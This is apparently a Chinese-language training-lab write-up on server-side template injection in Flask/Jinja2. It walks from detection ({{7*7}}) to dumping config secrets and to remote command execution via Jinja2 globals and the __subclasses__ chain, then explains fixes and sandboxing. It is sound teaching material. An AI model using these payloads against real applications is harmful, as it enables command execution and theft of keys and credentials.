# 自定义欢迎语里的模板注入（SSTI）

## 这一题在教什么

SSTI 的本质是一个**认知错误**：

> 「用户填的内容里可以有 `{{ }}`，那我把它的值替换进去」≠「我把用户填的内容当模板跑一遍」

前者是字符串替换，安全；后者是**让你的输入变成了程序**。

这一题是 Python 栈独有的经典坑，PHP 靶场里没有对应的东西。

## 漏洞在哪

`module.py`：

```python
rendered = render_template_string(template, user="alice", team="安全组")
```

`template` 是用户提交的。`render_template_string` 会把它**当成 Jinja2 模板编译并执行**。

正确写法是反过来 —— 模板是固定的，用户输入只当变量：

```python
return render_template("profile.html", greeting=user_input)
#                                      ^^^^^^^^^^^ 模板里写 {{ greeting }}，这才是"值"
```

## 怎么打通

三层，一层比一层深。页面上的「里程碑」会记你打到哪了。

**第一层：证明它被求值了**

```
{{7*7}}
```

预览里出现 `49` —— 你的输入被当成代码跑了。

**第二层：把应用配置掏出来**

```
{{config}}
```

Flask 默认把 `config` 放进模板命名空间，密钥、数据库连接串都在里面。

**第三层：拿到命令执行**

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

输出里有 `uid=` 就是 RCE。

**这条路是怎么走通的：**

1. `cycler` 是 Jinja2 的内置全局变量，它是个 Python 类
2. `cycler.__init__` 是一个 Python 函数对象
3. 函数的 `__globals__` 指向**定义它的那个模块的全局命名空间** —— 也就是 jinja2 模块
4. jinja2 模块里 `import os` 过，所以那里有 `os`
5. 拿到 `os` 就等于拿到了整台机器

**通用套路**（换任何模板引擎/上下文都能先试这个）：

```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

这会把当前解释器里所有能摸到的类列出来。在输出里搜 `subprocess.Popen`、
`os._wrap_close`、`warnings.catch_warnings`，然后顺着链子调。

其他常用入口：`{{ lipsum.__globals__ }}`、`{{ request.application.__globals__ }}`、
`{{ self.__init__.__globals__ }}`。

## 怎么修

**核心：永远不要把用户输入当模板。** 用户的输入是**值**，不是**代码**。

1. **固定模板 + 传变量**（首选）：

   ```python
   render_template("greeting.html", name=user_input)
   ```

2. 如果确实需要"用户自定义文案"，用**纯文本替换**，或者干脆沙箱化：

   ```python
   from string import Template
   Template(user_input).safe_substitute(name=user, team=team)   # 只认 $name，不求值
   ```

3. 真想给用户模板能力（比如低代码平台），上 **Jinja2 SandboxedEnvironment**：

   ```python
   from jinja2.sandbox import SandboxedEnvironment
   env = SandboxedEnvironment()
   env.from_string(user_input).render(...)
   ```

   沙箱会拦掉 `__class__` / `__globals__` 这类属性访问。**但沙箱逃逸是门长期功课**，
   别以为套上就万事大吉 —— 版本升级经常修沙箱逃逸的洞。

## 顺手想想

- `{{ config }}` 能读到东西，说明 Flask 默认往模板里塞了哪些名字？
  怎么在 Flask 里减少这个暴露面？
- 如果渲染结果不显示给用户（比如只存进数据库再在别处显示），SSTI 还成立吗？
- 「服务端模板注入」和「客户端模板注入」（比如 Vue/Angular 的 `{{ }}`）
  在利用手法和危害上有什么不同？
